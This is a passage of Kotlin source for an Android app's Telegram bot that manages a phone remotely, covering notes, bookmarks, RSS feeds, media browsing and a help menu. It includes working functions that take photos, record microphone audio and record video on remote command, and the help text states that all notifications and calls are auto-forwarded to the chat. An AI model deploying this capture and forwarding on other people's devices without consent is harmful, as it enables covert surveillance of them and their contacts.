        sb.append("═══════════════════════════\n")
        sb.append("📝 <b>NOTES & BOOKMARKS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /notes [search] — Browse notes, tap to view, edit or delete\n")
        sb.append("• /addnote — Create a new note (interactive: title then body)\n")
        sb.append("• /bookmarks [search] — Browse bookmarks, tap to open / delete\n")
        sb.append("• /addbookmark &lt;url&gt; — Save a URL as a bookmark\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📡 <b>RSS FEEDS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /feeds — List subscribed feeds, tap one for recent entries\n")
        sb.append("• /feedentries [search] — Search across all recent feed entries\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🎵 <b>MEDIA LIBRARY</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /music [search] — Browse music library, tap to download\n")
        sb.append("• /videos [search] — Browse video library, tap to download\n")
        sb.append("• /images [search] — Browse image gallery, tap to send\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🍅 <b>FOCUS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /pomodoro — Show timer status with start / pause / stop buttons\n")
        sb.append("• /pomodoro start — Begin a new focus session\n")
        sb.append("• /pomodoro pause — Pause the running timer\n")
        sb.append("• /pomodoro stop — Cancel the current session\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📶 <b>NETWORK</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /wifi — Show Wi-Fi state and current SSID\n")
        sb.append("• /wifi on — Turn Wi-Fi on (Android 9 and earlier)\n")
        sb.append("• /wifi off — Turn Wi-Fi off (Android 9 and earlier)\n")
        sb.append("• /netusage [days] — Mobile + Wi-Fi data usage for the last N days (1–30)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("⚙️ <b>BOT CONTROL</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /start — Show welcome message & status\n")
        sb.append("• /help — Quick command reference\n")
        sb.append("• /commands — This detailed help\n")
        sb.append("• /stop — Stop the bot\n\n")
        sb.append("🔄 <b>AUTO-FORWARDING (always on):</b>\n")
        sb.append("All new notifications, incoming/outgoing calls and missed calls are automatically forwarded to this chat in real-time.")
        sendMessage(sb.toString())
    }

    @SuppressLint("MissingPermission")
    private suspend fun capturePhoto(context: Context, useFront: Boolean): File? {
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgCameraCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var imageReader: ImageReader? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { imageReader?.close() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                val file = File(context.cacheDir, "tg_photo_${System.currentTimeMillis()}.jpg")
                imageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)
                imageReader!!.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()
                            file.writeBytes(bytes)
                            cleanup()
                            if (cont.isActive) cont.resume(if (file.length() > 0) file else null)
                        } catch (e: Exception) {
                            image.close()
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                }, handler)

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(imageReader!!.surface),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                                addTarget(imageReader!!.surface)
                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
                                            }
                                            session.capture(req.build(), null, handler)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgCamera capturePhoto: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private suspend fun recordAudio(context: Context, seconds: Int): File? {
        val file = File(context.cacheDir, "tg_audio_${System.currentTimeMillis()}.m4a")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return try {
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            LogCat.e("TgAudio recordAudio: ${e.message}")
            try { recorder.release() } catch (_: Throwable) {}
            null
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun recordVideo(context: Context, seconds: Int, useFront: Boolean): File? {
        val file = File(context.cacheDir, "tg_video_${System.currentTimeMillis()}.mp4")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgVideoCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var surface: android.view.Surface? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { recorder.release() } catch (_: Throwable) {}
                try { surface?.release() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoSize(1280, 720)
                    setVideoFrameRate(30)
                    setOutputFile(file.absolutePath)
                    prepare()
                }
                surface = recorder.surface

                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(surface!!),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                                addTarget(surface!!)
                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                            }
                                            session.setRepeatingRequest(req.build(), null, handler)
                                            recorder.start()
                                            handler.postDelayed({
                                                try {
                                                    recorder.stop()
                                                } catch (_: Throwable) {}
                                                cleanup()
                                                if (cont.isActive) cont.resume(if (file.exists() && file.length() > 0) file else null)
                                            }, seconds * 1000L)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgVideo recordVideo: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private fun htmlEsc(s: String?): String {
        if (s.isNullOrEmpty()) return ""
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    }

    private fun fmtTime(epochMs: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(epochMs))

    private fun fileIcon(name: String): String {
        val ext = name.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg", "png", "gif", "webp", "bmp" -> "🖼"
            "mp4", "mkv", "avi", "mov", "webm" -> "🎬"
            "mp3", "aac", "ogg", "wav", "flac", "m4a" -> "🎵"
            "pdf" -> "📄"
            "doc", "docx" -> "📝"
            "xls", "xlsx" -> "📊"
            "ppt", "pptx" -> "📋"
            "zip", "rar", "7z", "tar", "gz" -> "📦"
            "apk" -> "📲"
            "txt", "log" -> "📃"
            else -> "📄"
        }
    }

    // ========================================================================
    // ====================  WEB-PANEL PARITY EXTENSIONS  =====================
    // ========================================================================

    /** Sanitize a string so it can be safely used as a callback_data segment (no ':'). */
    private fun safeSeg(s: String): String = s.replace(':', '_').replace(' ', '_')

    /** Stable short token for package names (some are >55 chars, plus we keep callback_data tidy). */
    private val pkgTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun pkgToken(pkg: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(pkg.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
        pkgTokens[hex] = pkg
        return hex
    }
    private fun pkgFromToken(t: String): String? = pkgTokens[t]

    // ---------------- Notes ----------------

    @Volatile private var lastNotesQuery: String = ""
    @Volatile private var lastNotesOffset: Int = 0

    private suspend fun cmdNotes(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderNotesPage(q, 0, editMessageId = null)
    }

    private suspend fun renderNotesPage(query: String, offset: Int, editMessageId: Long?) {
        lastNotesQuery = query
        lastNotesOffset = offset
        try {
            val pageSize = 10
            val items = NoteHelper.search(query, pageSize + 1, offset)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📝 No notes found.\n\nUse /addnote to create one." else "📝 No more notes."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📝 <b>Notes</b> · ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a note to view, or send /addnote to create one.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, n ->
                val title = n.title.ifBlank { n.getSummary().take(40).ifBlank { "(untitled)" } }
                val short = n.getSummary().take(80)
                sb.append("${offset + i + 1}. 📝 <b>${htmlEsc(title)}</b>\n")
                if (short.isNotBlank() && short != title) sb.append("   <i>${htmlEsc(short)}</i>\n")
                sb.append("   🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "note_view:${n.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "notes_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "notes_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("➕ New note" to "note_view:__new__"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read notes: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderNoteDetail(id: String, editMessageId: Long?) {
        if (id == "__new__") { cmdAddNote(); return }
        val n = NoteHelper.getById(id)
        if (n == null) {
            val msg = "❌ Note not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val title = n.title.ifBlank { "(untitled)" }
        val sb = StringBuilder()
        sb.append("📝 <b>${htmlEsc(title)}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
        sb.append("<pre>${htmlEsc(n.content.take(3500))}</pre>")
        if (n.content.length > 3500) sb.append("\n<i>… truncated (${n.content.length} chars total)</i>")
        val rows = listOf(
            listOf("✏️ Edit" to "note_edit:${n.id}", "🗑 Trash" to "note_del:${n.id}"),
            listOf("⬅️ Back" to "note_back"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdAddNote() {
        pendingInput = "note_create"
        sendMessage("➕ <b>New note</b>\n\nReply with the note content.\n• If you include a line break, the <b>first line is the title</b>, the rest is the body.\n• If single line, it becomes both title and body.\n\nSend any /command to cancel.")
    }

    // ---------------- Bookmarks ----------------

    @Volatile private var lastBookmarksQuery: String = ""
    @Volatile private var lastBookmarksOffset: Int = 0

    private suspend fun cmdBookmarks(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) args.joinToString(" ").lowercase() else ""
        renderBookmarksPage(q, 0, editMessageId = null)
    }

    private suspend fun renderBookmarksPage(query: String, offset: Int, editMessageId: Long?) {
        lastBookmarksQuery = query
        lastBookmarksOffset = offset
        try {
            val all = BookmarkHelper.getAll()
            val filtered = if (query.isBlank()) all else all.filter {
                it.title.lowercase().contains(query) || it.url.lowercase().contains(query)
            }
            val pageSize = 10
            val total = filtered.size
            val pageItems = filtered.drop(offset).take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🔖 No bookmarks found.\n\nUse /addbookmark &lt;url&gt; to add one." else "🔖 No more bookmarks."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🔖 <b>Bookmarks</b> · ${offset + 1}–${offset + pageItems.size} of $total\n")
            sb.append("<i>Tap to open on device or manage.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, b ->
                val title = b.title.ifBlank { b.url }
                val pin = if (b.pinned) "📌 " else ""
                sb.append("${offset + i + 1}. ${pin}🔗 <b>${htmlEsc(title.take(80))}</b>\n")
                sb.append("   <code>${htmlEsc(b.url.take(80))}</code>\n")
                if (b.clickCount > 0) sb.append("   👁 ${b.clickCount} opens\n")
                sb.append("\n")
                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "bm_view:${b.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "bm_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < total) nav.add("Next ▶️" to "bm_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read bookmarks: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderBookmarkDetail(id: String, editMessageId: Long?) {
        val b = BookmarkHelper.getById(id)
        if (b == null) {
            val msg = "❌ Bookmark not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val sb = StringBuilder()
        sb.append("🔖 <b>${htmlEsc(b.title.ifBlank { b.url })}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🔗 <code>${htmlEsc(b.url)}</code>\n\n")
        if (b.pinned) sb.append("📌 Pinned\n")
        if (b.clickCount > 0) sb.append("👁 Opened ${b.clickCount} times\n")
        sb.append("🕐 Added ${fmtTime(b.createdAt.toEpochMilliseconds())}\n")
        val rows = listOf(
            listOf("🌐 Open on device" to "bm_open:${b.id}"),
            listOf("🗑 Delete" to "bm_del:${b.id}", "⬅️ Back" to "bm_back"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdAddBookmark(args: List<String>) {
        if (args.isEmpty()) {
            pendingInput = "bookmark_url"
            sendMessage("➕ <b>Add bookmark</b>\n\nReply with the full URL (must start with <code>http://</code> or <code>https://</code>).\nSend any /command to cancel.")
            return
        }
        val url = args.joinToString(" ").trim()
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            sendMessage("❌ URL must start with <code>http://</code> or <code>https://</code>")
            return
        }
        try {
            val list = BookmarkHelper.addBookmarks(listOf(url))
            val b = list.firstOrNull()
            if (b != null) {
                sendMessage("✅ Bookmark added: <code>${htmlEsc(url)}</code>\n<i>Title/favicon will fetch in background.</i>")
                scope.launch { try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {} }
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Feeds ----------------

    private suspend fun cmdFeeds() {
        sendTyping()
        renderFeedsList(editMessageId = null)
    }

    private suspend fun renderFeedsList(editMessageId: Long?) {
        try {
            val feeds = FeedHelper.getAll()
            if (feeds.isEmpty()) {
                val msg = "📡 No RSS feeds added.\n\nReply with a feed URL to add one (use the link below)."
                val rows = listOf(listOf("➕ Add feed URL" to "fe_view:__add__"))
                val markup = TelegramApiClient.inlineKeyboard(rows)
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val counts = try { FeedHelper.getFeedCounts().associate { it.id to it.count } } catch (_: Throwable) { emptyMap() }
            val sb = StringBuilder("📡 <b>RSS Feeds</b> (${feeds.size})\n<i>Tap a feed to view recent entries.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            feeds.forEachIndexed { i, f ->
                val n = counts[f.id] ?: 0
                sb.append("${i + 1}. 📡 <b>${htmlEsc(f.name.ifBlank { f.url })}</b>  ·  $n entries\n")
                sb.append("   <code>${htmlEsc(f.url.take(70))}</code>\n\n")
                rows.add(listOf("${i + 1}. ${f.name.ifBlank { f.url }.take(28)}" to "feed_view:${f.id}"))
            }
            rows.add(listOf("📰 All recent entries" to "fe_view:__all__"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load feeds: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdFeedEntries(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderFeedEntriesPage("", 0, editMessageId = null, baseQuery = q)
    }

    private suspend fun renderFeedEntriesPage(feedId: String, offset: Int, editMessageId: Long?, baseQuery: String = "") {
        if (feedId == "__add__") {
            pendingInput = "feed_url"
            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https). It must be a valid RSS or Atom feed.\nSend any /command to cancel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        try {
            val q = when {
                feedId == "__all__" || feedId.isBlank() -> baseQuery
                else -> {
                    val extra = "feed_id:$feedId"
                    if (baseQuery.isBlank()) extra else "$extra $baseQuery"
                }
            }
            val pageSize = 10
            val items = FeedEntryHelper.search(q, pageSize + 1, offset)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            val feedName = if (feedId.isNotBlank() && feedId != "__all__") {
                FeedHelper.getById(feedId)?.name ?: "feed"
            } else "All feeds"
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📰 No entries in <b>${htmlEsc(feedName)}</b>." else "📰 No more entries."
                val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("⬅️ Back to feeds" to "feeds_back")))
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val sb = StringBuilder("📰 <b>${htmlEsc(feedName)}</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap an entry to read.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, e ->
                val mark = if (e.read) "✓" else "🔵"
                sb.append("${offset + i + 1}. $mark <b>${htmlEsc(e.title.take(80))}</b>\n")
                sb.append("   🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
                if (e.author.isNotBlank()) sb.append("   ✍ ${htmlEsc(e.author.take(40))}\n")
                sb.append("\n")
                rows.add(listOf("${offset + i + 1}. ${e.title.take(30)}" to "fe_view:${e.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val fid = feedId.ifBlank { "_" }
            if (offset > 0) nav.add("◀️ Prev" to "fe_pg:$fid:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "fe_pg:$fid:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("⬅️ Back to feeds" to "feeds_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load entries: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderFeedEntryDetail(id: String, editMessageId: Long?) {
        if (id == "__add__") {
            pendingInput = "feed_url"
            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https).\nSend any /command to cancel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        if (id == "__all__") { renderFeedEntriesPage("__all__", 0, editMessageId); return }
        val e = FeedEntryHelper.getAsync(id)
        if (e == null) {
            val msg = "❌ Entry not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        // Mark as read
        try { FeedEntryHelper.updateAsync(id) { read = true } } catch (_: Throwable) {}
        val sb = StringBuilder()
        sb.append("📰 <b>${htmlEsc(e.title)}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        if (e.author.isNotBlank()) sb.append("✍ ${htmlEsc(e.author)}\n")
        sb.append("🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
        if (e.url.isNotBlank()) sb.append("🔗 <a href=\"${htmlEsc(e.url)}\">Read original</a>\n")
        sb.append("\n")
        val body = e.content.ifBlank { e.description }.replace(Regex("<[^>]+>"), "").trim()
        sb.append(htmlEsc(body.take(3500)))
        if (body.length > 3500) sb.append("\n<i>… truncated</i>")
        val rows = listOf(listOf("⬅️ Back" to "fe_back:${e.feedId}:0"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Music / Videos / Images library ----------------

    private suspend fun cmdMusic(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderMusicPage(q, 0, editMessageId = null)
    }

    private suspend fun renderMusicPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = AudioMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🎵 No audio tracks found." else "🎵 No more tracks."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🎵 <b>Music</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a track to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val mins = a.duration / 60; val secs = a.duration % 60
                sb.append("${offset + i + 1}. 🎵 <b>${htmlEsc(a.title.take(60))}</b>\n")
                if (a.artist.isNotBlank()) sb.append("   👤 ${htmlEsc(a.artist.take(50))}\n")
                sb.append("   ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(a.size)}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${a.title.take(28)}" to "mus_get:${pathToken(a.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "mus_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "mus_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            // Playback controls row
            val isPlaying = AudioPlayer.isPlaying()
            val playPauseBtn = if (isPlaying) "⏸ Pause" to "np_pause" else "▶️ Play" to "np_play"
            rows.add(listOf("⏮" to "np_prev", playPauseBtn, "⏭" to "np_next", "🎵 Now Playing" to "np_refresh"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read music: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cbSendMediaAudio(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Track gone: <code>${htmlEsc(path)}</code>"); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadDocument()
        val ok = TelegramApiClient.sendAudio(token, chatId, f, "🎵 ${htmlEsc(f.name)}", 0)
        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
    }

    private suspend fun cmdVideoLibrary(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderVideosPage(q, 0, editMessageId = null)
    }

    private suspend fun renderVideosPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = VideoMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🎞 No videos found." else "🎞 No more videos."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🎞 <b>Videos</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a video to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, v ->
                val mins = v.duration / 60; val secs = v.duration % 60
                sb.append("${offset + i + 1}. 🎬 <b>${htmlEsc(v.title.take(60))}</b>\n")
